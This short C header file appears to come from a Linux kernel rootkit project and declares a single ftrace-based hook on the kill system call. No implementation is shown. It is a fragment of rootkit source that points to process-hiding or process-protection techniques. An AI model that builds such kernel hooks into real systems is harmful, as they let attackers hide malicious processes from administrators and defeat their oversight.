//
// Created by black on 22-10-17.
//

#ifndef UCAS_ROOTKIT_PROCESS_H
#define UCAS_ROOTKIT_PROCESS_H

#include <linux/ftrace.h>

//PAGE_SHIFT

long HookKill(struct pt_regs *regs, long (*orig_func)(const struct pt_regs *));

#endif //UCAS_ROOTKIT_PROCESS_H
